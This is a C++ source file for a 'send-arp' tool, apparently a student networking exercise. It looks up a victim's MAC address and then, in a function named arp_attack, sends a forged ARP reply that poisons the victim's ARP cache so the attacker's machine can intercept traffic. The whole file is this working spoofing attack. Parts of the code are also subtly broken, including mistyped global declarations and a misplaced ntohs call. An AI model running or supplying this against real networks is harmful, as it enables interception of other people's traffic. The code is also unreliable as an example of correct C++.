#include "ethhdr.h"
#include "arphdr.h"

#include <cstdio>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <pcap.h>

char* ip, mac;
char* sip, smac;
char* dip, dmac;

#pragma pack(push, 1)

struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)


void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void find_my_ip(char* interface, char IP_str[20]){
	struct ifreq ifr;
	int s;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0){
        printf("failed\n");
    } else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, IP_str,sizeof(struct sockaddr));  
    }
}

void find_my_mac(char* interface, char MAC_str[20]){
    int s,i;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, interface);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    for (i=0; i<6; i++)
        sprintf(&MAC_str[i*3],"%02x:",((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]);
	sprintf(&MAC_str[i*3],"%02x",((unsigned char*)ifr.ifr_hwaddr.sa_data)[i]);
    MAC_str[17]='\0';
}

void send_arp_request(char* interface, char* srcip, char* srcmac, char* dstip, char* dstmac){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		return;
	}
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(srcmac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(srcmac);
	packet.arp_.sip_ = htonl(Ip(srcip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(dstip));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	struct pcap_pkthdr* header;
    const u_char* packet1;
	while(1){
		int r = pcap_next_ex(handle, &header, &packet1);
		struct EthArpPacket *pkt = (struct EthArpPacket*) packet1;
		if(ntohs( pkt->eth_.type_ == htons(EthHdr::Arp))) break;
	}
	struct EthArpPacket *pkt = (struct EthArpPacket*) packet1;
	Mac mac = pkt->arp_.smac_;
	strcpy(dstmac, std::string(mac).c_str());
	pcap_close(handle);
}

void arp_attack(char* interface, char* attip, char* attmac, char* vtmip, char* vtmmac){
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
		if (handle == nullptr) {
			fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
			return;
		}
		EthArpPacket packet;

		packet.eth_.dmac_ = Mac(vtmmac);
		packet.eth_.smac_ = Mac(attmac);
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply);
		packet.arp_.smac_ = Mac(attmac);
		packet.arp_.sip_ = htonl(Ip(attip));
		packet.arp_.tmac_ = Mac(vtmmac);
		packet.arp_.tip_ = htonl(Ip(vtmip));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		pcap_close(handle);

		sleep(1);	
}

int main(int argc, char* argv[]) {

	if ((argc % 2) != 0 ) {
		usage();
		return 1;
	}

	char* dev = argv[1];
	char ipstr[20];
	char macstr[20];
	char macs[20];
	char macd[20];

	for(int i = 2; i < argc; i += 2){
		memset(macs, 0, sizeof(macs));
		memset(macd, 0, sizeof(macd));

		sip = argv[i];
		dip = argv[i+1];
	
		find_my_ip(dev, ipstr);  
    	find_my_mac(dev, macstr);
		ip = ipstr;
    	mac = macstr;

		strcpy(macs, mac);
		send_arp_request(dev, ip, macs, sip, macd);
		smac = macd;

		arp_attack(dev, dip, mac, sip, smac);

		sleep(1);
	}
}